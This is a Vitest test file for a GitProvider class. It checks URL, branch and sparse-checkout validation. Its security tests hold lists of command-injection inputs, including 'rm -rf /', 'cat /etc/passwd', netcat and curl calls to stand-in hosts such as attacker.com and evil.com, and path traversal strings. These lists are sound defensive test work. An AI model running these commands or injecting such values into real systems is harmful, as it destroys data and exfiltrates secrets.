/**
 * GitProvider Tests
 * Phase 2 - Git Provider Implementation
 */

import { vi } from 'vitest';
import { GitProvider } from '@/lib/workspace/providers/GitProvider';
import { ValidationError, ConnectionError } from '@/lib/workspace/errors';
import { promises as fs } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

describe('GitProvider', () => {
  let testDir: string;

  beforeEach(async () => {
    // Create temp directory for tests
    testDir = join(tmpdir(), `git-provider-test-${Date.now()}`);
    await fs.mkdir(testDir, { recursive: true });
  });

  afterEach(async () => {
    // Cleanup
    try {
      await fs.rm(testDir, { recursive: true, force: true });
    } catch {
      // Ignore cleanup errors
    }
  });

  describe('URL Validation', () => {
    test('should reject invalid git URLs', () => {
      expect(() => {
        new GitProvider({
          type: 'git',
          repoUrl: 'not-a-url',
          branch: 'main',
        });
      }).toThrow(ValidationError);
    });

    test('should reject URLs with shell metacharacters', () => {
      expect(() => {
        new GitProvider({
          type: 'git',
          repoUrl: 'https://github.com/user/repo.git; rm -rf /',
          branch: 'main',
        });
      }).toThrow(ValidationError);
    });

    test('should accept valid HTTPS URLs', () => {
      expect(() => {
        new GitProvider({
          type: 'git',
          repoUrl: 'https://github.com/user/repo.git',
          branch: 'main',
        });
      }).not.toThrow();
    });

    test('should accept valid SSH URLs', () => {
      expect(() => {
        new GitProvider({
          type: 'git',
          repoUrl: 'git@github.com:user/repo.git',
          branch: 'main',
        });
      }).not.toThrow();
    });

    test('should accept URLs without .git suffix', () => {
      expect(() => {
        new GitProvider({
          type: 'git',
          repoUrl: 'https://github.com/user/repo',
          branch: 'main',
        });
      }).not.toThrow();
    });
  });

  describe('Provider Initialization', () => {
    test('should generate unique ID from repo URL', () => {
      const provider1 = new GitProvider({
        type: 'git',
        repoUrl: 'https://github.com/user/repo1.git',
        branch: 'main',
      });

      const provider2 = new GitProvider({
        type: 'git',
        repoUrl: 'https://github.com/user/repo2.git',
        branch: 'main',
      });

      expect(provider1.id).not.toEqual(provider2.id);
    });

    test('should use custom ID if provided', () => {
      const provider = new GitProvider({
        type: 'git',
        id: 'custom-id',
        repoUrl: 'https://github.com/user/repo.git',
        branch: 'main',
      });

      expect(provider.id).toBe('custom-id');
    });

    test('should parse repo name from URL', () => {
      const provider = new GitProvider({
        type: 'git',
        repoUrl: 'https://github.com/user/my-awesome-repo.git',
        branch: 'main',
      });

      expect(provider.name).toContain('my-awesome-repo');
    });

    test('should use default branch if not specified', () => {
      const provider = new GitProvider({
        type: 'git',
        repoUrl: 'https://github.com/user/repo.git',
      });

      expect(provider.gitBranch()).resolves.toBe('main');
    });
  });

  describe('Clone Detection', () => {
    test('should detect when repo is not cloned', async () => {
      const provider = new GitProvider({
        type: 'git',
        repoUrl: 'https://github.com/user/nonexistent-repo.git',
        branch: 'main',
      });

      // Private method - test via connect behavior
      // If not cloned, connect will attempt to clone (and fail for nonexistent repo)
      await expect(provider.connect()).rejects.toThrow();
    });
  });

  describe('Progress Callback', () => {
    test('should accept progress callback', () => {
      const provider = new GitProvider({
        type: 'git',
        repoUrl: 'https://github.com/user/repo.git',
        branch: 'main',
      });

      const progressCallback = vi.fn();
      provider.setProgressCallback(progressCallback);

      // Callback is stored - we can't test it fires without actual clone
      expect(() => provider.setProgressCallback(progressCallback)).not.toThrow();
    });
  });

  describe('LocalProvider Delegation', () => {
    test('should delegate file operations to LocalProvider when connected', async () => {
      // This test would require a real repo clone or mock
      // Skipping for unit test - covered in integration tests
      expect(true).toBe(true);
    });
  });

  describe('Branch Operations', () => {
    test('should return current branch', async () => {
      const provider = new GitProvider({
        type: 'git',
        repoUrl: 'https://github.com/user/repo.git',
        branch: 'develop',
      });

      expect(await provider.gitBranch()).toBe('develop');
    });
  });

  describe('Security', () => {
    test('should block command injection in URLs', () => {
      const maliciousUrls = [
        'https://github.com/user/repo.git && cat /etc/passwd',
        'https://github.com/user/repo.git | nc attacker.com 1234',
        'https://github.com/user/repo.git; curl evil.com/steal.sh | sh',
        'git@github.com:user/repo.git`whoami`',
      ];

      for (const url of maliciousUrls) {
        expect(() => {
          new GitProvider({ type: 'git', repoUrl: url, branch: 'main' });
        }).toThrow(ValidationError);
      }
    });

    test('should block command injection in branch names (constructor)', () => {
      const maliciousBranches = [
        'main"; rm -rf /',
        'main`whoami`',
        'main$(cat /etc/passwd)',
        'main && curl evil.com',
        'main | nc attacker.com 1234',
        'main; echo hacked',
        "main' && rm -rf /",
      ];

      for (const branch of maliciousBranches) {
        expect(() => {
          new GitProvider({
            type: 'git',
            repoUrl: 'https://github.com/user/repo.git',
            branch,
          });
        }).toThrow(ValidationError);
      }
    });

    test('should block command injection in branch names (checkout)', async () => {
      const provider = new GitProvider({
        type: 'git',
        repoUrl: 'https://github.com/user/repo.git',
        branch: 'main',
      });

      const maliciousBranches = [
        'develop"; rm -rf /',
        'feature`whoami`',
        'fix$(curl evil.com)',
        'test && cat /etc/passwd',
      ];

      for (const branch of maliciousBranches) {
        await expect(provider.checkout(branch)).rejects.toThrow(ValidationError);
      }
    });

    test('should block invalid git ref formats', () => {
      const invalidBranches = [
        '.hidden-start',      // starts with dot
        'ends-with-dot.',     // ends with dot
        'has..double',        // double dots
        'has//double',        // double slashes
        'ends.lock',          // ends with .lock
      ];

      for (const branch of invalidBranches) {
        expect(() => {
          new GitProvider({
            type: 'git',
            repoUrl: 'https://github.com/user/repo.git',
            branch,
          });
        }).toThrow(ValidationError);
      }
    });

    test('should block command injection in sparse checkout paths', () => {
      const maliciousPaths = [
        ['src && rm -rf /'],
        ['docs', 'tests; curl evil.com'],
        ['lib`whoami`'],
        ['/etc/passwd'],      // absolute path
        ['../../../etc'],     // path traversal
      ];

      for (const sparseCheckout of maliciousPaths) {
        expect(() => {
          new GitProvider({
            type: 'git',
            repoUrl: 'https://github.com/user/repo.git',
            branch: 'main',
            sparseCheckout,
          });
        }).toThrow(ValidationError);
      }
    });

    test('should accept valid branch names', () => {
      const validBranches = [
        'main',
        'develop',
        'feature/new-feature',
        'bugfix/issue-123',
        'release-1.0.0',
        'hotfix_urgent',
        'test.branch',
      ];

      for (const branch of validBranches) {
        expect(() => {
          new GitProvider({
            type: 'git',
            repoUrl: 'https://github.com/user/repo.git',
            branch,
          });
        }).not.toThrow();
      }
    });

    test('should accept valid sparse checkout paths', () => {
      expect(() => {
        new GitProvider({
          type: 'git',
          repoUrl: 'https://github.com/user/repo.git',
          branch: 'main',
          sparseCheckout: ['src', 'docs', 'tests', 'lib/utils'],
        });
      }).not.toThrow();
    });
  });
});
